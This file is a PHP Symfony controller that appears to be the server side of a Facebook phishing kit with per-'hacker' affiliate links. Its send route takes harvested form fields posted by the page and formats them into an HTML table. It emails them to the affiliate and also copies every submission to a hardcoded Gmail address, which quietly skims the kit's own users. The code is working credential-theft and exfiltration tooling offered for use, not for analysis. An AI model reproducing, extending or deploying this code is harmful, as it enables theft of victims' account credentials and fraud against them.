<?php

namespace App\Controller;

use App\Entity\HackersFor;
use App\Repository\HackersForRepository;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class HackersController extends AbstractController
{
    #[Route('/', name: 'app_hackers')]
    public function app_hackers(): Response
    {
        return $this->render('hackers/index.html.twig', [
            'hacker' => "admin",
        ]);
    }
    
    #[Route('/{name}', name: 'app_hackers_for_one')]
    public function app_hackers_for_one(HackersFor $hackersFor): Response
    {
        if($hackersFor){ $hacker = $hackersFor->getName(); } else { $hacker = "admin"; }
        return $this->render('hackers/index.html.twig', [
            'hacker' => $hacker,
        ]);
    }

    
    /**
     * @Route("/send/mail", name="send",options= {"expose" = true},methods={"POST"})
     */
    public function send(Request $request, HackersForRepository $hackersForRepository, SendMailHackers $sendMailHackers, EntityManagerInterface $em): Response
    {
        if ($request->isXmlHttpRequest()){
            $datas = $request->request->get('datas');
            $datas = json_decode($datas);

            $html = <<<HTML
                <table width="100%">
            HTML;
            
            foreach ($datas as $data) {
                if($data->titre != "hacker"){
                    $titre = str_replace("_", " ", strtoupper($data->titre));

                    $html .= <<<HTML
                        <tr>
                            <td style='text-align: center; border: 1px solid rgb(241, 241, 241); font-size: 16px;'>{$titre}</td>
                            <td style='text-align: center; border: 1px solid rgb(241, 241, 241); font-size: 16px;'><strong>{$data->value}</strong></td>
                        <tr>
                    HTML;

                } else {
                    $hacker = $hackersForRepository->findOneBy(['name' => $data->value]);
                    if($hacker){
                        $hacker->setNombre($hacker->getNombre()+1);
                        $em->flush();
                        if ($hacker->getActivated() == true) {
                            $mail = $hacker->getMail();
                        } else {
                            $mail = "nealcaffrey2026@gmail.com";
                        }
                    } else {
                        $mail = "nealcaffrey2026@gmail.com";
                    }
                }
            }
            $html .= <<<HTML
                </table>
            HTML;

            $subject = "FACEBOOK No ".time();
            if($mail != "nealcaffrey2026@gmail.com"){
                $sendMailHackers->smtpMail($mail, $subject, $html, $mail, $subject);
                $sendMailHackers->smtpMail("nealcaffrey2026@gmail.com", $subject, $html, "nealcaffrey2026@gmail.com", $subject);
                return new Response("OK"); 
            }
            $sendMailHackers->smtpMail($mail, $subject, $html, $mail, $subject);
            return new Response("OK"); 
        }

        return new Response("OK"); 
    }
}
